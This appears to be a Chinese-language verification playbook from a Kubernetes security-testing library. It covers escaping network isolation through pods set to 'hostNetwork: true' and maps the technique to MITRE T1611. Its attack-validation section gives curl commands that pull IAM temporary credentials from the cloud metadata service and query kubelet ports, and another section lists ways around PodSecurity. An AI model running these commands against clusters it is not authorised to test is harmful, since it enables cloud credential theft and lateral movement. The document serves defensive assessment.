---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.10]
mapped_compliance_families: [Pod安全, 网络隔离]
---

# hostnetwork-abuse — hostNetwork 网络隔离逃逸

Pod 配置 `hostNetwork: true`，容器直接使用宿主机网络命名空间，可访问节点网络（metadata 服务、localhost 绑定服务、CNI/iptables），实现网络隔离逃逸与横向移动。

---

## 1. 前置条件

- Pod 配置 `spec.hostNetwork: true`
- 攻击者对该 Pod 有 exec 权限或 Pod 镜像被劫持
- 节点网络存在可达的敏感服务（metadata、kubelet localhost、数据库等）

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 是否启用 hostNetwork
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.hostNetwork}'
# 期望输出: true

# [L1] 容器内观察：确认与宿主机共享网络命名空间
kubectl exec -n <ns> <pod-name> -- cat /proc/net/dev | head
# 期望输出: 包含宿主机网卡（eth0/ens 等）而非仅容器虚拟网卡
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 hostNetwork 配置
kubectl get pod <pod-name> -n <ns> -o yaml | grep -i hostNetwork
# 期望输出: hostNetwork: true

# [L1] 容器内观察：获取容器视角的网络接口（应为宿主机接口）
kubectl exec -n <ns> <pod-name> -- ip addr
# 期望输出: 包含宿主机网卡与 IP，而非容器 veth

# [L1] 容器内观察：访问云元数据服务（hostNetwork 下通常可达）
kubectl exec -n <ns> <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/
# 期望输出: 云元数据 JSON（AWS/Azure/GCP）

# [L1] 容器内观察：访问节点 localhost 上的 kubelet 只读端口
kubectl exec -n <ns> <pod-name> -- curl -s http://127.0.0.1:10255/pods
# 期望输出: Pod 列表 JSON
```

## 3. 攻击验证

```bash
# [L1] 容器内攻击验证：通过 hostNetwork 访问云元数据窃取凭证
kubectl exec -n <ns> <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 期望输出: 角色名列表

# [L2] 容器内攻击验证：用窃取的云凭证进一步访问云资源
kubectl exec -n <ns> <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# 期望输出: AccessKeyId/SecretAccessKey/Token（云临时凭证）

# [L1] 容器内攻击验证：扫描节点 localhost 暴露的内部服务
kubectl exec -n <ns> <pod-name> -- curl -s http://127.0.0.1:10250/pods -k
# 期望输出: 节点 kubelet 暴露的 Pod 列表
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录普通 Pod 无法访问 metadata
kubectl exec -n <other-ns> <normal-pod> -- curl -s --max-time 3 http://169.254.169.254/latest/meta-data/
# 期望输出: 空（被 NetworkPolicy 或 iptables 阻断）

# [L0] 攻击后环境对比：hostNetwork Pod 可访问 metadata
kubectl exec -n <ns> <pod-name> -- curl -s --max-time 3 http://169.254.169.254/latest/meta-data/
# 期望输出: 云元数据 JSON → 证明 hostNetwork 绕过了网络隔离
```

差分结论：普通 Pod 因 kubernetes 网络隔离无法访问 169.254.169.254，hostNetwork Pod 直接使用宿主机网络可访问 metadata，证明网络隔离逃逸成功。

## 5. 绕过策略

```bash
# [L0] 检查 PodSecurity 是否限制 hostNetwork
kubectl get namespace <ns> -o jsonpath='{.metadata.labels}'
# 若含 pod-security.kubernetes.io/enforce=restricted/baseline → hostNetwork 被禁止

# 绕过方式：
# - [L1] 若 hostNetwork 启用但 metadata 被 iptables 阻断，通过节点其他 localhost 服务横向移动
# - [L2] 若 PodSecurity 限制但命名空间豁免，使用豁免命名空间部署 hostNetwork Pod
# - [L1] 若仅限制 metadata IP，访问节点 CNI/iptables 暴露的本地端口
```

## 6. 证伪条件

```bash
# [L0] Pod 未启用 hostNetwork
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.hostNetwork}'
# 输出: false 或空 → 证伪

# [L1] 容器内网卡为容器虚拟网卡
kubectl exec -n <ns> <pod-name> -- ip -o link show | grep -v lo
# 输出: 仅 veth/cali 等容器网卡 → 证伪

# [L1] 无法访问 metadata 服务
kubectl exec -n <ns> <pod-name> -- curl -s --max-time 3 http://169.254.169.254/latest/meta-data/
# 无输出或超时 → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（窃取云凭证）→ **Level 4**（访问敏感云凭证，需人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Lateral Movement
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者通过 `hostNetwork: true` 配置的 Pod 直接使用宿主机网络命名空间，绕过 Kubernetes 网络隔离，访问节点网络上的敏感服务与云元数据。